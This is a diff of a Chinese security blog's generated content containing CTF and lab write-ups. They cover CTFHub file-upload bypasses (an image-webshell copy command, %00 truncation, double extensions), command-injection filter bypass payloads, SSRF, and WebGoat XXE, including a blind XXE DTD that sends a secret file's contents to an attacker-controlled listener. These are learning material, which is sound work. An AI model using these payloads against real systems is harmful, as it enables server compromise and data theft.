+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">【也可以用<span class="keyword">cmd</span><span class="language-bash"> 合成图片马，也是有图片文件头】</span></span><br><span class="line"></span><br><span class="line">【<span class="keyword">copy</span><span class="language-bash"> 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】</span></span><br><span class="line"></span><br><span class="line">【已试可行】</span><br></pre></td></tr></table></figure></div>
+
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731164732820.png" alt="image-20220731164732820"></p>
-<p>【已试可行】</p>
 <p>然后正常用蚁剑连接</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731164330254.png" alt="image-20220731164330254"></p>
-<p>得到flag</p>
+<p>得到<code>flag</code></p>
 <h2 id="9-文件上传-00截断"><a href="#9-文件上传-00截断" class="headerlink" title="9.文件上传-00截断"></a>9.文件上传-00截断</h2><h3 id="0x00截断原理：-php-lt-5-3-29"><a href="#0x00截断原理：-php-lt-5-3-29" class="headerlink" title="0x00截断原理：[php&lt;5.3.29]"></a>0x00截断原理：[php&lt;5.3.29]</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COS"><figure class="iseeu highlight /cos"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x00是十六进制表示方法，是<span class="keyword">ascii</span>码为<span class="number">0</span>的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到<span class="number">0</span>x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</span><br><span class="line"></span><br><span class="line">但要注意是文件的<span class="number">16</span>进制内容里的<span class="number">00</span>，而不是文件名中的<span class="number">00</span> ！！！就是说系统是按<span class="number">16</span>进制读取文件（或者说二进制），</span><br><span class="line"></span><br><span class="line">遇到<span class="keyword">ascii</span>码为零的位置就停止，而这个<span class="keyword">ascii</span>码为零的位置在<span class="number">16</span>进制中是<span class="number">00</span>，用<span class="number">0</span><span class="keyword">x</span>开头表示<span class="number">16</span>进制，也就是所说的<span class="number">0</span>x00截断。</span><br><span class="line"></span><br><span class="line">%<span class="number">00</span>是被服务器解码为<span class="number">0</span>x00发挥了截断作用。</span><br></pre></td></tr></table></figure></div>
 
 <p><code>举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。</code></p>
-<p>我们开始先上传一个文件试试，限制jpg,png,gif后缀</p>
+<p>我们开始先上传一个文件试试，限制<code>jpg,png,gif</code>后缀</p>
 <p>上传成功后，没有显示上传路径，只是url变化</p>
 <p><code>http://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html</code></p>
 <p> 猜想多半重新临时文件名，不固定，导致显示不了路径</p>
-<p>这里就需要00截断，要把文件上传的路径，找到，好用蚁剑连接</p>
-<p>先要清楚%00截断点在哪里，我们先F12看</p>
+<p>这里就需要<code>00截断</code>，要把文件上传的路径，找到，好用蚁剑连接</p>
+<p>先要清楚<code>%00</code>截断点在哪里，我们先F12看</p>
 <p>看网站源码</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info[&#x27;extension&#x27;];</span></span><br><span class="line"><span class="comment">    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo &quot;文件类型不匹配&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
 
@@ -2469,14 +2565,14 @@ handler 指向RequestHandler
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="variable">$info</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;gif&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$des</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;road&#x27;</span>] . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>) . <span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$des</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型不匹配&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
 
 <p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
-<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个%00截断后面的语句</p>
-<p>也就是下面这个</p>
+<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>
+<p>也就是下面这个请求头后面</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731233456720.png" alt="image-20220731233456720"></p>
-<p>图片正常上传就可以，这就是把图片内容上传到1.php文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为1.php的一句话木马</p>
-<p>【名字不重要，虽然图片和php文件名一样，这里1.php是随便取得，主要蚁剑连接的就是它】</p>
+<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>
+<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731233716114.png"></p>
 <p>用蚁剑连接<code>url/upload/1.php</code></p>
-<p>得到flag</p>
+<p>得到<code>flag</code></p>
 <h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731165549883.png" alt="image-20220731165549883"></p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731165841829.png" alt="image-20220731165841829"></p>
@@ -2484,10 +2580,10 @@ handler 指向RequestHandler
 <h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p>这道题</p>
-<p>看到|，;，&amp;都被过滤了</p>
-<p>那么可以用%0a也是换行符代替</p>
-<p>空格，/，cat，flag，ctfhub（没关系）</p>
-<p>$IFS代替空格，cat可以用more代替，%09代替TAB键，用来补全flag</p>
+<p>看到<code>|，;，&amp;</code>都被过滤了</p>
+<p>那么可以用<code>%0a</code>也是换行符代替</p>
+<p>空格，/，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>
+<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>
 <p><code>?ip=120.0.0.1%0als</code></p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220801215911504.png" alt="image-20220801215911504"></p>
 <p>然后</p>
@@ -2496,7 +2592,7 @@ handler 指向RequestHandler
 <p>后面就简单了</p>
 <p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
 <p>右键查看源码</p>
-<p>得到flag</p>
+<p>得到<code>flag</code></p>
 <h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220802103546644.png" alt="image-20220802103546644"></p>
 <p><img src="/2022/07/27/CTFHub-wp/.%5CCTFHub-wp%5Cimage-20220802103603770.png" alt="image-20220802103603770"></p>
 <p>所以构造payload</p>
@@ -3025,8 +3121,8 @@ handler 指向RequestHandler
 <h1 id="Web新手"><a href="#Web新手" class="headerlink" title="Web新手"></a>Web新手</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
 <h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>右键不管用，直接用F12查看</p>
 <p>得到flag</p>
-<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧</p>
-<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>不清楚robots协议是什么，于是我百度了一下，</p>
+<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师上课讲了<code>Robots</code>协议，小宁同学却上课打了瞌睡，赶紧来教教小宁<code>Robots</code>协议是什么吧</p>
+<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>不清楚<code>robots</code>协议是什么，于是我百度了一下，</p>
 <p><code>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取</code></p>
 <p>也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问<code>http://111.200.241.244:54251/robots.txt</code></p>
 <p>界面显示如下</p>
@@ -4135,6 +4231,10 @@ file_get_contents() 函数是用于将文件的内容读入到一个字符串中
 <p><img src="/2022/06/21/underline-learning/image-20220905094540906.png" alt="image-20220905094540906"></p>
 <h1 id="Upload-labs"><a href="#Upload-labs" class="headerlink" title="Upload-labs"></a>Upload-labs</h1><h1 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h1><h2 id="一-XXE"><a href="#一-XXE" class="headerlink" title="一.XXE"></a>一.XXE</h2><h3 id="1-Let’s-try"><a href="#1-Let’s-try" class="headerlink" title="1.Let’s try"></a>1.Let’s try</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">在此作业中，您将为照片添加评论，在提交表单时尝试使用评论字段执行 XXE 注入。尝试列出文件系统的根目录。</span><br></pre></td></tr></table></figure>
 
+
+
+
+
 <p>我们先提交评论然后抓包试试</p>
 <p><img src="/2022/06/21/underline-learning/image-20221015192748515.png" alt="image-20221015192748515"></p>
 <p>这时我们发现评论的内容是在用<code>xml</code>进行传递，</p>
@@ -4144,6 +4244,10 @@ file_get_contents() 函数是用于将文件的内容读入到一个字符串中
 <p><img src="/2022/06/21/underline-learning/image-20221015195142684.png" alt="image-20221015195142684"></p>
 <p>成功</p>
 <h3 id="2-Modern-REST-framework"><a href="#2-Modern-REST-framework" class="headerlink" title="2.Modern REST framework"></a>2.Modern REST framework</h3><h4 id="前言：-1"><a href="#前言：-1" class="headerlink" title="前言："></a>前言：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">在现代 REST 框架中，服务器可能能够接受您作为开发人员没有考虑过的数据格式。因此，这可能会导致 JSON 端点容易受到 XXE 攻击。</span><br><span class="line"></span><br><span class="line">再次进行相同的练习，但尝试执行与我们在第一个作业中所做的相同的 <span class="keyword">XML</span> <span class="title">注入。</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+
 
 <p>这个明显发现底下的评论传递格式不再是<code>xml</code></p>
 <p>而是在用<code>json</code>进行传递</p>
@@ -4164,7 +4268,47 @@ file_get_contents() 函数是用于将文件的内容读入到一个字符串中
 <p>成功</p>
 <h3 id="3-Blind-XXE-assignment"><a href="#3-Blind-XXE-assignment" class="headerlink" title="3.Blind XXE assignment"></a>3.Blind XXE assignment</h3><h4 id="前言：-2"><a href="#前言：-2" class="headerlink" title="前言："></a>前言：</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">在本作业中尝试制作一个 DTD，它将文件 secret.txt 的内容从 WebGoat 服务器上传到我们的 WebWolf 服务器。您可以使用 WebWolf 为您的 DTD 提供服务。secret.txt 位于此位置的 WebGoat 服务器上，因此您无需扫描所有目录和文件：</span><br><span class="line"></span><br><span class="line">你	                 地点</span><br><span class="line">Windows <span class="number">10</span>            C:\Users\Ttoc<span class="regexp">/.webgoat-8.2.2/</span><span class="regexp">/XXE/</span>secret.txt</span><br><span class="line"></span><br><span class="line">尝试使用 WebWolf 登录页面上传此文件，例如：（ 注意：此端点由您完全控制）一旦您获得文件的内容，将其作为新评论发布在页面上，您将解决课程。http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9090</span>/landing</span><br></pre></td></tr></table></figure></div>
 
+
+
+
+
 <p>盲注就是没有回显内容，但是我们需要把我们目标服务器的敏感文件内容获取到我们的服务器</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">简而言之，</span><br><span class="line"></span><br><span class="line">webgoat开启了站点，这个站点有XXE，webgoat服务器上有个密码文件，通过XXE把这个密码文件读取，并且发送到我们自己的恶意站点webwolf，webwolf接受到这个请求就顺理成章获取了密码文件里面的密码</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里主要利用<code>xml</code>通过<code>DTD</code>实现文件包含，</p>
+<p>先把我们自己写的<code>DTD</code>文件包含在我们的服务器<code>webwolf</code>，然后在<code>webgoat</code>上通过<code>xxe</code>进行远程包含我们站点的这个<code>DTD</code>文件，然后<code>webgoat</code>在解析我们的<code>DTD</code>文件的时候就会把<code>secret.txt</code>文件内容赋值到文件并作为参数发送到我们的<code>webwolf</code>服务器</p>
+<hr>
+<p>我们先发送评论看看</p>
+<p>这里发送的是空内容，回显的内容看来是提示，</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">需要我们先在`webwolf`上上传文件</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/06/21/underline-learning/image-20221017201611949.png" alt="image-20221017201611949"></p>
+<p>我们先抓包看看webgoat的评论的解析格式是怎么样的</p>
+<p><img src="/2022/06/21/underline-learning/image-20221017201938082.png" alt="image-20221017201938082"></p>
+<p>看来是正常的<code>xml</code>解析</p>
+<p>我们先在<code>webwolf</code>上上传我们的<code>evil.dtd</code>文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">//声明变量 <span class="keyword">write</span> 并嵌套赋值&lt;!ENTITY <span class="keyword">send</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;http://localhost:9090/landing?text=%file;&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">为什么还要用一个参数实体嵌套呢？</span><br><span class="line">因为如果我们用一个write参数实体将send外部实体的定义写进请求中，在%write;执行的过程中，%file也会被替换成相应的文本。因此最后，?text后面的值就是我们想要的内容</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/06/21/underline-learning/image-20221017205520515.png" alt="image-20221017205520515"></p>
+<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">这里的变量赋值和前面的不同</span><br><span class="line">它是</span><br><span class="line"><span class="comment">%（空格）变量名</span></span><br><span class="line">这种命名的方式的变量只能在DTD里用，而在xml里用不了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/21/underline-learning/image-20221017211907400.png" alt="image-20221017211907400"></p>
+<p>上传成功后我们在<code>incoming requests</code>里看到上传路径，这样在<code>webgoat</code>就调用访问包含就行了</p>
+<p><img src="/2022/06/21/underline-learning/image-20221017211827208.png" alt="image-20221017211827208"></p>
+<p>然后我们再在<code>webgoat</code>抓包数据里构造我们的<code>payload</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">comment</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Users/Ttoc/.webgoat-8.2.2/XXE/secret.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//这个路径是有这个文件，因为在执行jar文件的时候，自动生成了这个文件</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">getdtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/ttocplus/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//注意这里是上传路径，要写自己的</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%getdtd; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%write;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">//在%getdtd;后面调用%write;</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="symbol">&amp;send;</span> </span></span><br><span class="line"><span class="language-xml">     //再调用%write里的&amp;send变量，这个变量是再嵌套的DTD语句中声明，所以需要在xml里调用</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>虽然提示是报错，但是我们到我们的<code>webwolf</code>上查看</p>
+<p><img src="/2022/06/21/underline-learning/image-20221018140310837.png" alt="image-20221018140310837"></p>
+<hr>
+<p>这个是<code>secret.txt</code>的值，我们看看<code>webwolf</code>上有没有获得该数据</p>
+<p><img src="/2022/06/21/underline-learning/image-20221017234256596.png" alt="image-20221017234256596"></p>
+<hr>
+<p>成功获取</p>
+<p><img src="/2022/06/21/underline-learning/image-20221018141126472.png" alt="image-20221018141126472"></p>
+<p>成功</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
